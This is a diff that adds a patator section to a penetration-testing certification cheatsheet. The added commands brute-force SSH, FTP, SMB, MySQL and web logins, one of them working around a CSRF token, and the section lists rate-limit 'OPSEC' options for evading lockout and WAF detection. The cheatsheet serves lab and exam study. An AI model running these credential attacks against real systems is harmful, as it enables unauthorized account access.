@@ -117,6 +117,7 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
 - [updog](#updog)
 - [Penelope](#Penelope)
 - [WebDAV](#WebDAV)
+- [patator](#patator)
 - [Burp Suite](#Burp-Suite)
 - [whatweb](#whatweb)
 - [SysReptor](#SysReptor)
@@ -4106,6 +4107,72 @@ davtest -url http://192.168.109.122/
 
 # Automatic scan with verified account
 davtest -url http://192.168.109.122/ -auth fmcsorley:CrabSharkJellyfish192
+
+
+```
+## patator
+```
+# Method 1: Install via apt (already available on Kali)
+sudo apt update && sudo apt install patator
+
+# Method 2: Install via pip (latest version from source)
+pip install patator --break-system-packages
+
+# Method 3: Clone from GitHub (to get the latest version + read source)
+git clone https://github.com/lanjelot/patator.git
+cd patator
+python3 patator.py --help
+
+# Basic command structure
+patator <module> <options>
+
+# SSH Brute-force
+patator ssh_login host=192.168.1.10 user=admin password=FILE0 0=rockyou.txt -x ignore:mesg='Authentication failed'
+
+# FTP Brute-force
+patator ftp_login host=192.168.1.10 user=FILE0 password=FILE1 0=users.txt 1=passwords.txt -x ignore:code=530
+
+# SMB Login (Active Directory)
+patator smb_login host=192.168.1.10 user=FILE0 password=FILE1 0=users.txt 1=passwords.txt -x ignore:code=STATUS_LOGON_FAILURE
+
+# MySQL Login
+patator mysql_login host=192.168.1.10 user=root password=FILE0 0=passwords.txt -x ignore:mesg='Access denied'
+
+# Simple Web Login Form (no CSRF)
+patator http_fuzz url=http://target/login.php \
+  method=POST \
+  body='username=FILE0&password=FILE1' \
+  0=users.txt 1=passwords.txt \
+  -x ignore:fgrep='Invalid credentials'
+
+# Web Login Form CÓ CSRF Token
+patator http_fuzz \
+  url=http://target/index.php/login \
+  method=POST \
+  body='login[_csrf_token]=_TOKEN_&login[email]=FILE0&login[password]=FILE1' \
+  0=emails.txt \
+  1=wordlist.txt \
+  before_urls=http://target/index.php/login \
+  before_egrep='_TOKEN_:name="csrf_token"[^>]*value="([^"]*)"' \
+  accept_cookie=1 \
+  follow=0 \
+  -x ignore:clen=116
+
+# Important result filtering flags (-x)
+-x ignore:code=200 # Ignore based on HTTP status code
+-x ignore:size=1234 # Ignore based on response size (bytes)
+-x ignore:clen=116 # Ignore based on Content-Length header
+-x ignore:fgrep='wrong' # Ignore if response contains this string
+-x ignore:egrep='fail.*' # Ignore based on regex
+-x ignore:mesg='Login failed' # Ignore based on protocol-specific message
+
+# Performance & OPSEC options
+-t 10                     # Number of concurrent threads (default 10, increase or decrease depending on target)
+-x quit:code=200          # STOP IMMEDIATELY when a correct result is found (saves time)
+--rate-limit=2            # Limit the request rate/second — avoid triggering lockout or WAF
+-l /tmp/patator.log # Write logs to a file for later review
+
+
 
 
 
